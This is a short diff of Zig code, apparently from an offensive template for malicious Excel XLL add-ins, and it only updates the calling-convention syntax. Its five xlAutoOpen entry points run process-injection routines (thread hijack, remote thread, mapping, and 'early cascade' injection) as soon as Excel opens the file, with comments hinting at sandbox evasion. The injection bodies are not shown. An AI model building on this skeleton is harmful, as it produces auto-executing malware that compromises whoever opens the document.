@@ -1,5 +1,5 @@
 // LOCAL MAPPING INJECTION 
-pub export fn xlAutoOpen() callconv(WINAPI) i32 {
+pub export fn xlAutoOpen() callconv(.winapi) i32 {
     // Sandbox protection option enabled?
     // enable runtime protection
     local_map_injection();
@@ -9,7 +9,7 @@ pub export fn xlAutoOpen() callconv(WINAPI) i32 {
 
 
 // HIJACK THREAD INJECTION 
-pub export fn xlAutoOpen() callconv(WINAPI) i32 {
+pub export fn xlAutoOpen() callconv(.winapi) i32 {
    // Sandbox protection option enabled?
    // enable runtime protection
     createThreadAndExecute(sampleProcedure);
@@ -18,7 +18,7 @@ pub export fn xlAutoOpen() callconv(WINAPI) i32 {
 // END OF HIJACK THREAD INJECTION 
 
 // REMOTE MAPPING INJECTION 
-pub export fn xlAutoOpen() callconv(WINAPI) i32 {
+pub export fn xlAutoOpen() callconv(.winapi) i32 {
     // Sandbox protection option enabled?
     // enable runtime protection
     remote_map_injection();
@@ -27,7 +27,7 @@ pub export fn xlAutoOpen() callconv(WINAPI) i32 {
 // END OF REMOTE MAPPING INJECTION  
 
 // REMOTE THREAD INJECTION 
-pub export fn xlAutoOpen() callconv(WINAPI) i32 {
+pub export fn xlAutoOpen() callconv(.winapi) i32 {
     // Sandbox protection option enabled?
     // enable runtime protection
     remote_thread_injection();
@@ -36,7 +36,7 @@ pub export fn xlAutoOpen() callconv(WINAPI) i32 {
 // END OF REMOTE THREAD INJECTION   
 
 // EARLY CASCADE INJECTION 
-pub export fn xlAutoOpen() callconv(WINAPI) i32 {
+pub export fn xlAutoOpen() callconv(.winapi) i32 {
     // Sandbox protection option enabled?
     // enable runtime protection
     run_cascade_injection();
